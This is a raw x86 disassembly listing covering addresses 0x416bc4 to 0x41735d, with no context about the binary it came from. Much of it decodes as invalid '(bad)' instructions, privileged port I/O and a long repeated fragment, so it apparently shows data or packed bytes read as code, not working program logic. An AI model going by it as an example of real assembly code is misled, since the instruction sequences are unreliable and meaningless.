  416bc4:	(bad)  [eax-0x6ba8511a]
  416bca:	jno    0x416b9e
  416bcc:	ins    DWORD PTR es:[edi],dx
  416bcd:	cmc    
  416bce:	jbe    0x416b8e
  416bd0:	nop
  416bd1:	scas   eax,DWORD PTR es:[edi]
  416bd2:	mov    al,ds:0x2457aee6
  416bd7:	jp     0x416bab
  416bd9:	ins    DWORD PTR es:[edi],dx
  416bda:	retf   
  416bdb:	add    bl,bl
  416bdd:	call   0xaf28109f
  416be2:	push   ebx
  416be3:	xchg   esp,eax
  416be4:	jno    0x416b68
  416be6:	sub    BYTE PTR [eax-0x245870d0],bl
  416bec:	mov    al,ds:0x9457aee6
  416bf1:	push   ecx
  416bf2:	shr    BYTE PTR [ebp+0x3b],cl
  416bf5:	sub    al,0xa9
  416bf7:	fwait
  416bf8:	test   eax,0x57aee6c3
  416bfd:	xchg   esp,eax
  416bfe:	adc    edx,edx
  416c00:	ins    DWORD PTR es:[edi],dx
  416c01:	fcmovnb st,st(2)
  416c03:	shr    al,1
  416c05:	fcomi  st,st(2)
  416c07:	out    0xae,al
  416c09:	push   edi
  416c0a:	(bad)  
  416c0b:	jne    0x416bdf
  416c0d:	ins    DWORD PTR es:[edi],dx
  416c0e:	fild   DWORD PTR [edx]
  416c10:	fucomi st,st(0)
  416c12:	(bad)  [eax-0x6ba8511a]
  416c18:	jno    0x416c0c
  416c1a:	ins    DWORD PTR es:[edi],dx
  416c1b:	fnclex 
  416c1d:	cmc    
  416c1e:	call   0x9457:0xcd89ccbe
  416c25:	jno    0x416bf7
  416c27:	ins    DWORD PTR es:[edi],dx
  416c28:	fild   DWORD PTR [edx]
  416c2a:	sti    
  416c2b:	in     al,0xdb
  416c2d:	mov    al,ds:0x9457aee4
  416c32:	int    0xd6
  416c34:	ins    DWORD PTR es:[edi],dx
  416c35:	fild   DWORD PTR [edx]
  416c37:	fucomi st,st(0)
  416c39:	(bad)  [eax-0x6ba8511a]
  416c3f:	jno    0x416c13
  416c41:	sub    eax,0xe81b02db
  416c46:	(bad)  [eax-0x6ba8511a]
  416c4c:	jno    0x416c20
  416c4e:	ins    DWORD PTR es:[edi],dx
  416c4f:	fild   DWORD PTR [edx]
  416c51:	fucomi st,st(0)
  416c53:	(bad)  [eax-0x6ba8511a]
  416c59:	jno    0x416c2d
  416c5b:	ins    DWORD PTR es:[edi],dx
  416c5c:	fild   DWORD PTR [edx]
  416c5e:	fucomi st,st(0)
  416c60:	(bad)  [eax-0x6ba8511a]
  416c66:	jno    0x416c3a
  416c68:	ins    DWORD PTR es:[edi],dx
  416c69:	fild   DWORD PTR [edx]
  416c6b:	fucomi st,st(0)
  416c6d:	(bad)  [eax-0x6ba8511a]
  416c73:	jno    0x416c47
  416c75:	ins    DWORD PTR es:[edi],dx
  416c76:	fild   DWORD PTR [edx]
  416c78:	fucomi st,st(0)
  416c7a:	(bad)  [eax-0x6ba8511a]
  416c80:	jno    0x416c54
  416c82:	ins    DWORD PTR es:[edi],dx
  416c83:	fild   DWORD PTR [edx]
  416c85:	fucomi st,st(0)
  416c87:	(bad)  [eax-0x6ba8511a]
  416c8d:	jno    0x416c61
  416c8f:	ins    DWORD PTR es:[edi],dx
  416c90:	fild   DWORD PTR [edx]
  416c92:	fucomi st,st(0)
  416c94:	(bad)  [eax-0x6ba8511a]
  416c9a:	jno    0x416c6e
  416c9c:	ins    DWORD PTR es:[edi],dx
  416c9d:	fild   DWORD PTR [edx]
  416c9f:	fucomi st,st(0)
  416ca1:	(bad)  [eax-0x6ba8511a]
  416ca7:	jno    0x416c7b
  416ca9:	ins    DWORD PTR es:[edi],dx
  416caa:	fild   DWORD PTR [edx]
  416cac:	fucomi st,st(0)
  416cae:	(bad)  [eax-0x6ba8511a]
  416cb4:	jno    0x416c88
  416cb6:	ins    DWORD PTR es:[edi],dx
  416cb7:	fild   DWORD PTR [edx]
  416cb9:	fucomi st,st(0)
  416cbb:	(bad)  [eax-0x6ba8511a]
  416cc1:	jno    0x416c95
  416cc3:	ins    DWORD PTR es:[edi],dx
  416cc4:	fild   DWORD PTR [edx]
  416cc6:	fucomi st,st(0)
  416cc8:	(bad)  [eax-0x6ba8511a]
  416cce:	jno    0x416ca2
  416cd0:	ins    DWORD PTR es:[edi],dx
  416cd1:	fild   DWORD PTR [edx]
  416cd3:	fucomi st,st(0)
  416cd5:	(bad)  [eax-0x6ba8511a]
  416cdb:	jno    0x416caf
  416cdd:	ins    DWORD PTR es:[edi],dx
  416cde:	fild   DWORD PTR [edx]
  416ce0:	fucomi st,st(0)
  416ce2:	(bad)  [eax-0x6ba8511a]
  416ce8:	jno    0x416cbc
  416cea:	ins    DWORD PTR es:[edi],dx
  416ceb:	fild   DWORD PTR [edx]
  416ced:	fucomi st,st(0)
  416cef:	(bad)  [eax-0x6ba8511a]
  416cf5:	jno    0x416cc9
  416cf7:	ins    DWORD PTR es:[edi],dx
  416cf8:	fild   DWORD PTR [edx]
  416cfa:	fucomi st,st(0)
  416cfc:	(bad)  [eax-0x6ba8511a]
  416d02:	jno    0x416cd6
  416d04:	ins    DWORD PTR es:[edi],dx
  416d05:	fild   DWORD PTR [edx]
  416d07:	fucomi st,st(0)
  416d09:	(bad)  [eax-0x6ba8511a]
  416d0f:	jno    0x416ce3
  416d11:	ins    DWORD PTR es:[edi],dx
  416d12:	fild   DWORD PTR [edx]
  416d14:	fucomi st,st(0)
  416d16:	(bad)  [eax-0x6ba8511a]
  416d1c:	jno    0x416cf0
  416d1e:	ins    DWORD PTR es:[edi],dx
  416d1f:	fild   DWORD PTR [edx]
  416d21:	fucomi st,st(0)
  416d23:	(bad)  [eax-0x6ba8511a]
  416d29:	jno    0x416cfd
  416d2b:	ins    DWORD PTR es:[edi],dx
  416d2c:	fild   DWORD PTR [edx]
  416d2e:	fucomi st,st(0)
  416d30:	(bad)  [eax-0x6ba8511a]
  416d36:	jno    0x416d0a
  416d38:	ins    DWORD PTR es:[edi],dx
  416d39:	fild   DWORD PTR [edx]
  416d3b:	fucomi st,st(0)
  416d3d:	(bad)  [eax-0x6ba8511a]
  416d43:	jno    0x416d17
  416d45:	ins    DWORD PTR es:[edi],dx
  416d46:	fild   DWORD PTR [edx]
  416d48:	fucomi st,st(0)
  416d4a:	(bad)  [eax-0x6ba8511a]
  416d50:	jno    0x416d24
  416d52:	ins    DWORD PTR es:[edi],dx
  416d53:	fild   DWORD PTR [edx]
  416d55:	fucomi st,st(0)
  416d57:	(bad)  [eax-0x6ba8511a]
  416d5d:	jno    0x416d31
  416d5f:	ins    DWORD PTR es:[edi],dx
  416d60:	fild   DWORD PTR [edx]
  416d62:	fucomi st,st(0)
  416d64:	(bad)  [eax-0x6ba8511a]
  416d6a:	jno    0x416d3e
  416d6c:	ins    DWORD PTR es:[edi],dx
  416d6d:	fild   DWORD PTR [edx]
  416d6f:	fucomi st,st(0)
  416d71:	(bad)  [eax-0x6ba8511a]
  416d77:	jno    0x416d4b
  416d79:	ins    DWORD PTR es:[edi],dx
  416d7a:	fild   DWORD PTR [edx]
  416d7c:	fucomi st,st(0)
  416d7e:	(bad)  [eax-0x6ba8511a]
  416d84:	jno    0x416d58
  416d86:	ins    DWORD PTR es:[edi],dx
  416d87:	fild   DWORD PTR [edx]
  416d89:	fucomi st,st(0)
  416d8b:	(bad)  [eax-0x6ba8511a]
  416d91:	jno    0x416d65
  416d93:	ins    DWORD PTR es:[edi],dx
  416d94:	fild   DWORD PTR [edx]
  416d96:	fucomi st,st(0)
  416d98:	(bad)  [eax-0x6ba8511a]
  416d9e:	jno    0x416d72
  416da0:	ins    DWORD PTR es:[edi],dx
  416da1:	fild   DWORD PTR [edx]
  416da3:	fucomi st,st(0)
  416da5:	(bad)  [eax-0x6ba8511a]
  416dab:	jno    0x416d7f
  416dad:	ins    DWORD PTR es:[edi],dx
  416dae:	fild   DWORD PTR [edx]
  416db0:	fucomi st,st(0)
  416db2:	(bad)  [eax-0x6ba8511a]
  416db8:	jno    0x416d8c
  416dba:	ins    DWORD PTR es:[edi],dx
  416dbb:	fild   DWORD PTR [edx]
  416dbd:	fucomi st,st(0)
  416dbf:	(bad)  [eax-0x6ba8511a]
  416dc5:	jno    0x416d99
  416dc7:	ins    DWORD PTR es:[edi],dx
  416dc8:	fild   DWORD PTR [edx]
  416dca:	fucomi st,st(0)
  416dcc:	fisttp DWORD PTR [ebx]
  416dce:	test   al,0xa5
  416dd0:	push   edi
  416dd1:	mov    ebx,0xdb7dd271
  416dd6:	add    dh,cl
  416dd8:	dec    edx
  416dd9:	add    esp,edx
  416ddb:	pop    ebx
  416ddc:	loope  0x416e42
  416dde:	xchg   BYTE PTR [edx-0x17],bl
  416de1:	push   eax
  416de2:	xor    al,0xb7
  416de4:	dec    ecx
  416de5:	out    dx,al
  416de6:	xchg   edx,eax
  416de7:	stc    
  416de8:	pop    ss
  416de9:	jb     0x416dcf
  416deb:	xchg   DWORD PTR [esi],esi
  416ded:	jmp    0x99ca7176
  416df2:	cdq    
  416df3:	sbb    DWORD PTR [edx-0x57],ebx
  416df6:	cmp    DWORD PTR [ecx],ecx
  416df8:	dec    ebx
  416df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dfa:	xchg   edx,eax
  416dfb:	push   cs
  416dfc:	mov    dh,0xe1
  416dfe:	pusha  
  416dff:	cmp    esi,edi
  416e01:	jecxz  0x416df2
  416e03:	xlat   BYTE PTR es:[ebx]
  416e05:	or     DWORD PTR [edx+esi*8-0x26be1cac],0xffffffa4
  416e0d:	pushf  
  416e0e:	js     0x416e8a
  416e10:	jns    0x416e2a
  416e12:	stos   BYTE PTR es:[edi],al
  416e13:	ret    0x9924
  416e16:	ret    0x9515
  416e19:	sbb    DWORD PTR [ecx+0x47497acf],ecx
  416e1f:	or     eax,DWORD PTR [ecx-0x7889a888]
  416e25:	nop
  416e26:	adc    al,0x71
  416e28:	dec    edi
  416e29:	add    BYTE PTR [edi+0x499048c0],cl
  416e2f:	dec    edx
  416e30:	mov    DWORD PTR [edi],esi
  416e32:	fild   QWORD PTR [eax+0x1382862e]
  416e38:	mov    eax,0xda8749e9
  416e3d:	das    
  416e3e:	jle    0x416dca
  416e40:	lock ret 
  416e42:	mov    ch,0x83
  416e44:	or     al,0xdd
  416e46:	mov    al,0x52
  416e48:	inc    eax
  416e49:	mov    DWORD PTR [eax+0x60],eax
  416e4c:	mov    al,ds:0xc23738f1
  416e51:	sti    
  416e52:	(bad)  
  416e53:	aas    
  416e54:	or     DWORD PTR [edi+0x1f],0xffffffbd
  416e58:	and    al,0x8d
  416e5a:	jbe    0x416ebb
  416e5c:	xor    eax,0xa0ae27a1
  416e61:	dec    esi
  416e62:	repnz imul DWORD PTR [ebp+0xc1bc82e]
  416e69:	xchg   ebp,eax
  416e6a:	enter  0x11b4,0xb6
  416e6e:	mov    cl,BYTE PTR [edx+0x28cd12a7]
  416e74:	inc    edx
  416e75:	adc    eax,0xb9a334c
  416e7a:	loopne 0x416e2c
  416e7c:	iret   
  416e7d:	push   eax
  416e7e:	pop    ds
  416e7f:	sub    DWORD PTR [edx-0x80],esi
  416e82:	outs   dx,DWORD PTR ds:[esi]
  416e83:	dec    eax
  416e84:	imul   esp,DWORD PTR [esi],0xffffff92
  416e87:	inc    ebx
  416e88:	push   edx
  416e89:	mov    esi,0x82aa7c5d
  416e8e:	dec    ebx
  416e8f:	cmp    al,0x33
  416e91:	or     ebx,DWORD PTR [esi]
  416e93:	or     BYTE PTR [edi+0x73b0f9fa],al
  416e99:	fld    TBYTE PTR [ecx+eiz*1-0x5088e575]
  416ea0:	lahf   
  416ea1:	not    ecx
  416ea3:	push   esi
  416ea4:	pusha  
  416ea5:	mov    al,0xf0
  416ea7:	fmulp  st(2),st
  416ea9:	mov    ah,0x54
  416eab:	jl     0x416ef2
  416ead:	pusha  
  416eae:	imul   DWORD PTR [eax-0x15ac7b6d]
  416eb4:	pop    ss
  416eb5:	inc    esp
  416eb6:	les    esp,FWORD PTR [eax]
  416eb8:	push   0xf7bcb136
  416ebd:	push   cs
  416ebe:	push   eax
  416ebf:	popf   
  416ec0:	jae    0x416ed7
  416ec2:	push   edx
  416ec3:	jl     0x416e90
  416ec5:	dec    edx
  416ec6:	fs mov cl,0xb9
  416ec9:	scas   al,BYTE PTR es:[edi]
  416eca:	loop   0x416e85
  416ecc:	inc    dh
  416ece:	ja     0x416ed6
  416ed0:	inc    ecx
  416ed1:	pop    esi
  416ed2:	or     DWORD PTR [ebx+0x387087f8],ebx
  416ed8:	outs   dx,DWORD PTR ds:[esi]
  416ed9:	sbb    esp,DWORD PTR [edi+0x3e2a65]
  416edf:	out    0x64,al
  416ee1:	jge    0x416f3b
  416ee3:	(bad)  
  416ee4:	in     al,dx
  416ee5:	sbb    dl,BYTE PTR [edx-0x135a8f28]
  416eeb:	int    0x59
  416eed:	adc    BYTE PTR [edx+ecx*2-0x25f2f81c],al
  416ef4:	sti    
  416ef5:	push   edx
  416ef6:	sub    DWORD PTR [ebx],ebx
  416ef8:	adc    BYTE PTR [edi-0x540fe4f5],cl
  416efe:	xchg   ebp,eax
  416eff:	mov    al,0xd3
  416f01:	push   esp
  416f02:	sub    eax,0x3ad3dd8a
  416f07:	adc    esi,DWORD PTR ds:[edi-0x7d]
  416f0b:	and    eax,DWORD PTR [ecx+0x5416748f]
  416f11:	push   0x70
  416f13:	xchg   ecx,eax
  416f14:	mov    esi,0x6aa21941
  416f19:	(bad)  
  416f1a:	out    dx,eax
  416f1b:	lahf   
  416f1c:	nop
  416f1d:	lods   al,BYTE PTR ds:[esi]
  416f1e:	sbb    DWORD PTR [ebx+0x48],ecx
  416f21:	fldenv [edx]
  416f23:	jbe    0x416eb7
  416f25:	mov    ch,BYTE PTR [ebx+0x65f45a05]
  416f2b:	push   ebp
  416f2c:	sahf   
  416f2d:	xchg   ebx,eax
  416f2e:	add    ecx,DWORD PTR [edi+0x2986eb0c]
  416f34:	cmp    eax,0x5567afee
  416f39:	xchg   DWORD PTR [esi-0x5bb3319],ecx
  416f3f:	popf   
  416f40:	xchg   ebp,eax
  416f41:	ins    DWORD PTR es:[edi],dx
  416f42:	jp     0x416f2a
  416f44:	xlat   BYTE PTR ds:[ebx]
  416f45:	xor    DWORD PTR [eax+0x46],0x237abfc9
  416f4c:	scas   eax,DWORD PTR es:[edi]
  416f4d:	imul   esi,DWORD PTR ds:0xb0aaf53,0x3b
  416f54:	cmp    edi,DWORD PTR [edx+0x7c8379ca]
  416f5a:	and    ah,BYTE PTR [esi]
  416f5c:	je     0x416f74
  416f5e:	sbb    ecx,DWORD PTR [ebx-0x63b5c070]
  416f64:	mov    ebx,0x3d924b9d
  416f69:	jns    0x416f7a
  416f6b:	push   eax
  416f6c:	fsub   st,st(2)
  416f6e:	sub    al,0xd0
  416f70:	xchg   ch,bl
  416f72:	mov    dl,0x56
  416f74:	stos   BYTE PTR es:[edi],al
  416f75:	dec    ecx
  416f76:	iret   
  416f77:	pop    esp
  416f78:	ins    BYTE PTR es:[edi],dx
  416f79:	ret    0x82fc
  416f7c:	add    al,0x33
  416f7e:	fldenv gs:[eax-0x52]
  416f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f83:	and    DWORD PTR ds:0x18fd5902,0x29305508
  416f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f8e:	dec    ebp
  416f8f:	fcmovnbe st,st(7)
  416f91:	xor    DWORD PTR [edi-0x27074444],edi
  416f97:	jecxz  0x416f64
  416f99:	or     ecx,DWORD PTR [edi+0x672b05c1]
  416f9f:	aas    
  416fa0:	ficomp DWORD PTR [ecx-0x70e8bfd0]
  416fa6:	push   ds
  416fa7:	(bad)  
  416fa8:	mov    ecx,0x168d2e25
  416fad:	in     al,dx
  416fae:	scas   al,BYTE PTR es:[edi]
  416faf:	out    dx,al
  416fb0:	xor    ch,cl
  416fb2:	in     al,dx
  416fb3:	push   ebp
  416fb4:	push   edx
  416fb5:	outs   dx,DWORD PTR ds:[esi]
  416fb6:	(bad)
  416fb9:	ins    BYTE PTR es:[edi],dx
  416fba:	into   
  416fbb:	jne    0x416f7a
  416fbd:	add    al,0x60
  416fbf:	xchg   BYTE PTR [esi+0x23117d5],bh
  416fc5:	push   ds
  416fc6:	les    eax,FWORD PTR [esi+0x489f803]
  416fcc:	add    ecx,DWORD PTR ds:0xc7a45702
  416fd2:	sub    DWORD PTR [ebx],ecx
  416fd4:	push   0x48f2335
  416fd9:	fs stos DWORD PTR es:[edi],eax
  416fdb:	pop    ecx
  416fdc:	cmp    BYTE PTR [edx],0x62
  416fdf:	and    al,0x3e
  416fe1:	add    al,0xa5
  416fe3:	pop    edx
  416fe4:	std    
  416fe5:	out    dx,eax
  416fe6:	jmp    0xef9920e5
  416feb:	or     esp,DWORD PTR [ecx+0x7d]
  416fee:	outs   dx,BYTE PTR ds:[esi]
  416fef:	jae    0x41705d
  416ff1:	stos   DWORD PTR es:[edi],eax
  416ff2:	mov    es,WORD PTR [ebx+0x1c]
  416ff5:	leave  
  416ff6:	xor    DWORD PTR ss:0x8564ab3f,ecx
  416ffd:	cmp    cl,BYTE PTR [esi-0x3a]
  417000:	push   edi
  417001:	mov    ecx,0xc2082c92
  417006:	test   al,0xb4
  417008:	push   0xfd144fb3
  41700d:	push   0x5fbf38a
  417012:	add    ch,BYTE PTR [ebx+ebp*2-0x14f05601]
  417019:	jl     0x41704d
  41701b:	ret    0xd64a
  41701e:	inc    esi
  41701f:	and    eax,0x18b4254c
  417024:	adc    eax,0x377db2dd
  417029:	mov    ds:0x2662d3f,al
  41702e:	pushf  
  41702f:	jmp    0x1a103b97
  417034:	mov    ecx,0x62912fe2
  417039:	mov    esi,0x3e185cce
  41703e:	aas    
  41703f:	fsub   st,st(3)
  417041:	ficomp WORD PTR [ebx]
  417043:	loop   0x417064
  417045:	xchg   edi,eax
  417046:	dec    edx
  417047:	push   0x5d
  417049:	pop    esi
  41704a:	ret    
  41704b:	daa    
  41704c:	adc    BYTE PTR [ebp+0x8dd1a05],0x7a
  417053:	addr16 lahf 
  417055:	mov    ah,0xf7
  417057:	loopne 0x416fea
  417059:	int    0x6c
  41705b:	adc    edx,DWORD PTR [ecx+0xc]
  41705e:	aad    0x19
  417060:	lods   al,BYTE PTR ds:[esi]
  417061:	ret    
  417062:	dec    eax
  417063:	mov    bh,0x74
  417065:	or     ch,dl
  417067:	xchg   ebp,eax
  417068:	mov    ebx,0xd39b0604
  41706d:	pop    eax
  41706e:	cs jecxz 0x417059
  417071:	push   eax
  417072:	or     BYTE PTR [ebp-0x2c85c663],bh
  417078:	or     eax,0xcfd13a71
  41707d:	cmp    al,0xa4
  41707f:	mul    DWORD PTR ds:0x6d27cef4
  417085:	sub    ecx,DWORD PTR [ebx+0x24]
  417088:	outs   dx,BYTE PTR ds:[esi]
  417089:	and    DWORD PTR [ebx+0x58],eax
  41708c:	push   cs
  41708d:	ret    
  41708e:	retf   0x57c8
  417091:	xchg   ecx,eax
  417092:	adc    cl,BYTE PTR [ecx]
  417094:	push   0x6276ff09
  417099:	lahf   
  41709a:	pop    esi
  41709b:	xchg   DWORD PTR [edi],edi
  41709d:	pop    esi
  41709e:	fcomp  DWORD PTR [edi+ebp*1]
  4170a1:	ins    DWORD PTR es:[edi],dx
  4170a2:	pop    ebp
  4170a3:	fadd   st,st(0)
  4170a5:	xlat   BYTE PTR ds:[ebx]
  4170a6:	scas   al,BYTE PTR es:[edi]
  4170a7:	inc    edi
  4170a8:	cmp    ch,BYTE PTR [ecx+eax*4+0x56329b2a]
  4170af:	aaa    
  4170b0:	and    BYTE PTR [eax+eax*8],0x7
  4170b4:	pop    es
  4170b5:	jg     0x41712c
  4170b7:	into   
  4170b8:	sbb    dl,cl
  4170ba:	or     bh,BYTE PTR [edi+0x2c]
  4170bd:	pop    DWORD PTR [ebp-0x59c36639]
  4170c3:	fwait
  4170c4:	hlt    
  4170c5:	lahf   
  4170c6:	ror    BYTE PTR [eax-0x4b],1
  4170c9:	mul    BYTE PTR [ecx]
  4170cb:	and    bl,BYTE PTR [ecx]
  4170cd:	push   ebx
  4170ce:	jns    0x41714f
  4170d0:	adc    eax,0x254addc6
  4170d5:	dec    esi
  4170d6:	push   edx
  4170d7:	or     esi,esp
  4170d9:	loope  0x4170c2
  4170db:	(bad)  
  4170dc:	mov    esi,0xf9d0b6d9
  4170e1:	repnz inc eax
  4170e3:	push   es
  4170e4:	les    edx,FWORD PTR [eax-0x75]
  4170e7:	mov    fs,WORD PTR [ecx-0x39]
  4170ea:	lods   eax,DWORD PTR ds:[esi]
  4170eb:	fdivr  QWORD PTR [ecx+edi*1]
  4170ee:	mov    al,0x6b
  4170f0:	in     eax,dx
  4170f1:	sbb    dl,al
  4170f3:	clc    
  4170f4:	lods   al,BYTE PTR ds:[esi]
  4170f5:	fdivr  QWORD PTR [eax]
  4170f7:	xor    DWORD PTR [esi-0x57],edi
  4170fa:	mov    bl,0x22
  4170fc:	jmp    0x417127
  4170fe:	out    0xd0,al
  417100:	and    al,0xdd
  417102:	xchg   ebx,eax
  417103:	fsubr  st(1),st
  417105:	mov    eax,ds:0x728c4bba
  41710a:	or     al,0xb8
  41710c:	jecxz  0x41709a
  41710e:	push   ecx
  41710f:	pop    ds
  417110:	sbb    DWORD PTR [edi-0x51],ebx
  417113:	dec    eax
  417114:	fst    QWORD PTR [ebp-0x3b824208]
  41711a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711b:	and    DWORD PTR [ecx+0x28ea55c8],0xffffff8a
  417122:	sbb    al,0x8
  417124:	inc    ebx
  417125:	lods   eax,DWORD PTR ds:[esi]
  417126:	push   0xbac20d3e
  41712b:	adc    BYTE PTR [edi+0x79af5285],al
  417131:	push   edx
  417132:	aas    
  417133:	gs adc eax,0xf7777b2c
  417139:	xchg   ecx,eax
  41713a:	inc    esi
  41713b:	sti    
  41713c:	fbld   TBYTE PTR [eax-0x52]
  41713f:	and    dl,BYTE PTR [esi-0x6ecabbc0]
  417145:	lods   al,BYTE PTR ds:[esi]
  417146:	out    dx,eax
  417147:	fs pop edx
  417149:	(bad)  
  41714a:	dec    ebp
  41714b:	sub    al,0xa6
  41714d:	sahf   
  41714e:	hlt    
  41714f:	mov    ebx,0xa24d05ed
  417154:	daa    
  417155:	leave  
  417156:	lock sbb BYTE PTR [ebx+0x7d],ch
  41715a:	out    dx,eax
  41715b:	sub    cl,BYTE PTR [esi]
  41715d:	mov    WORD PTR [edx+esi*1-0x6c44fa81],gs
  417164:	adc    ch,BYTE PTR [esi+0x4]
  417167:	sbb    al,0xd4
  417169:	mov    dl,0x4
  41716b:	ret    0xad69
  41716e:	xor    esp,eax
  417170:	les    ebp,FWORD PTR [edx]
  417172:	test   al,0xf9
  417174:	and    eax,0x5bd675b2
  417179:	shr    esi,1
  41717b:	je     0x41710c
  41717d:	jg     0x4171d0
  41717f:	(bad)  
  417180:	sub    esi,DWORD PTR ds:0x23fcb7f2
  417186:	dec    ecx
  417187:	repnz cmc 
  417189:	sbb    DWORD PTR [esi+0x39],ebx
  41718c:	shr    BYTE PTR [ecx+eax*1+0x6a],0xf
  417191:	pop    ebp
  417192:	and    ah,BYTE PTR [ecx]
  417194:	mov    WORD PTR [edi],gs
  417196:	and    BYTE PTR [esi+0x11],0x49
  41719a:	fwait
  41719b:	adc    eax,DWORD PTR [ebx]
  41719d:	xor    ah,BYTE PTR [eax]
  41719f:	and    eax,DWORD PTR [edx]
  4171a1:	call   0x1c80:0xb8b373f0
  4171a8:	adc    dh,bl
  4171aa:	sub    BYTE PTR [ecx],al
  4171ac:	cmp    ch,dl
  4171ae:	fild   QWORD PTR [ebp-0x36]
  4171b1:	sar    ch,1
  4171b3:	je     0x4171f0
  4171b5:	jmp    FWORD PTR [eax]
  4171b7:	pop    ebp
  4171b8:	sub    eax,0x1ad5bdbb
  4171bd:	xor    cl,dh
  4171bf:	loope  0x4171f3
  4171c1:	test   eax,0xd41f7522
  4171c6:	cdq    
  4171c7:	xchg   ebx,eax
  4171c8:	push   esi
  4171c9:	and    BYTE PTR ds:[ebx],ch
  4171cc:	ret    
  4171cd:	aas    
  4171ce:	mov    eax,0xa40eaaf6
  4171d3:	mov    ebp,0x2c97d44b
  4171d8:	push   edx
  4171d9:	or     eax,0x777b15c9
  4171de:	repnz mov ch,0x9e
  4171e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e2:	imul   ebp,DWORD PTR [ebx],0x13
  4171e5:	add    bl,BYTE PTR [esi+0x6c]
  4171e8:	and    eax,0x9e38aeaf
  4171ed:	or     ebx,edx
  4171ef:	mov    dl,0xfa
  4171f1:	and    BYTE PTR [edx],dl
  4171f3:	pushf  
  4171f4:	mov    al,0x25
  4171f6:	cmc    
  4171f7:	cmp    eax,0x9b143cb1
  4171fc:	int3   
  4171fd:	xchg   dh,ch
  4171ff:	aaa    
  417200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417201:	nop
  417202:	outs   dx,DWORD PTR ds:[esi]
  417203:	jns    0x41725a
  417205:	cmc    
  417206:	ror    ebp,cl
  417208:	arpl   WORD PTR [ecx],si
  41720a:	out    dx,eax
  41720b:	dec    edx
  41720c:	sub    eax,0x4dff8c20
  417211:	ffree  st(5)
  417213:	lea    ebp,[ebx+0x4b]
  417216:	repz xchg ecx,eax
  417218:	sbb    dl,BYTE PTR [esi]
  41721a:	les    ecx,FWORD PTR [ebp+ecx*2+0x4cc0fff7]
  417221:	mov    ecx,0xd96b299c
  417226:	cmp    cl,BYTE PTR [ebp-0x31d0f61d]
  41722c:	repz xchg edi,eax
  41722e:	call   0xc339:0x8811f72d
  417235:	add    BYTE PTR [ebx-0x1241ddb1],cl
  41723b:	push   0x9a5072df
  417240:	rcr    BYTE PTR [edi-0x3d],0xe8
  417244:	sub    DWORD PTR [esi+eiz*1-0x3a169397],esi
  41724b:	fist   DWORD PTR [edi+0x10]
  41724e:	jmp    0x3105:0x4873808b
  417255:	xchg   edi,eax
  417256:	adc    al,0xab
  417258:	popf   
  417259:	pop    ss
  41725a:	pop    ebx
  41725b:	and    BYTE PTR [edx-0xe],dl
  41725e:	add    DWORD PTR [ebx+0x1d],0x1580e768
  417265:	enter  0x5055,0xaa
  417269:	dec    ebp
  41726a:	in     eax,dx
  41726b:	jbe    0x4172a1
  41726d:	mov    ecx,0x530d2f75
  417272:	or     eax,0x40c84bb3
  417277:	in     al,0x2
  417279:	adc    al,BYTE PTR [esi+ecx*2]
  41727c:	and    eax,0xff1593e5
  417281:	scas   al,BYTE PTR es:[edi]
  417282:	lock push eax
  417284:	add    al,0x4d
  417286:	pop    edi
  417287:	push   0xffffffad
  417289:	mov    bl,0x56
  41728b:	sti    
  41728c:	pop    esi
  41728d:	mov    ebx,0x8c3798f3
  417292:	test   BYTE PTR [esi-0x54],bh
  417295:	xor    eax,0x4e112d40
  41729a:	cmp    esi,DWORD PTR [ecx-0x2abd930d]
  4172a0:	mov    eax,0x4704943b
  4172a5:	mov    ecx,0xcb352c4c
  4172aa:	les    esi,FWORD PTR [edx+0x69]
  4172ad:	pop    ebx
  4172ae:	repz adc WORD PTR [edi],cx
  4172b2:	mov    ds:0xc428c9c3,al
  4172b7:	cmp    DWORD PTR [edx+0x5286f850],esp
  4172bd:	mov    eax,0xb6896ccc
  4172c2:	icebp  
  4172c3:	lahf   
  4172c4:	ret    
  4172c5:	cmc    
  4172c6:	or     al,0xde
  4172c8:	fwait
  4172c9:	arpl   WORD PTR [edi+0x35],dx
  4172cc:	hlt    
  4172cd:	stos   BYTE PTR es:[edi],al
  4172ce:	(bad)  
  4172cf:	jnp    0x417338
  4172d1:	fild   QWORD PTR [edx+0x2bd52f31]
  4172d7:	es push edi
  4172d9:	nop
  4172da:	out    dx,eax
  4172db:	int3   
  4172dc:	xchg   DWORD PTR [eax],ecx
  4172de:	imul   esi,DWORD PTR [ebp+0x24e13ec5],0x196b3e47
  4172e8:	push   0x7b80fd0
  4172ed:	(bad)  
  4172ee:	ds push edx
  4172f0:	jno    0x417359
  4172f2:	(bad)  
  4172f3:	aad    0x33
  4172f5:	into   
  4172f6:	retf   
  4172f7:	pop    es
  4172f8:	sbb    al,0x70
  4172fa:	xchg   edx,eax
  4172fb:	mov    ebx,0x612226ac
  417300:	jno    0x41729d
  417302:	aas    
  417303:	add    BYTE PTR [edx+ebp*2-0x5314ece6],cl
  41730a:	enter  0x6539,0x90
  41730e:	jge    0x417378
  417310:	outs   dx,DWORD PTR ds:[esi]
  417311:	add    DWORD PTR [edi+0x2c],esi
  417314:	jecxz  0x417307
  417316:	in     eax,0x93
  417318:	retf   
  417319:	pop    esp
  41731a:	addr16 lahf 
  41731c:	xchg   ebp,eax
  41731d:	sbb    eax,0x8b7ca7e3
  417322:	fbld   TBYTE PTR [esi-0x79]
  417325:	sub    eax,0x3442bcee
  41732a:	jne    0x4172dc
  41732c:	stos   DWORD PTR es:[edi],eax
  41732d:	fcomp  DWORD PTR [edx-0x42]
  417330:	adc    al,0xee
  417332:	dec    eax
  417333:	pushf  
  417334:	or     edi,eax
  417336:	sar    BYTE PTR [ebp+0x35754575],cl
  41733c:	pop    edx
  41733d:	inc    ebp
  41733e:	pop    es
  41733f:	aam    0x78
  417341:	push   ecx
  417342:	lods   al,BYTE PTR ds:[esi]
  417343:	sbb    eax,0x8b92a7b8
  417348:	ds das 
  41734a:	mov    ebp,0xc9f40fbd
  41734f:	(bad)  
  417350:	ror    bl,1
  417352:	pop    ds
  417353:	frstor [ebp+0x22906ece]
  417359:	sti    
  41735a:	test   al,0xb0
  41735c:	xlat   BYTE PTR ds:[ebx]
  41735d:	sbb    BYTE PTR [edx-0x5658263f],cl
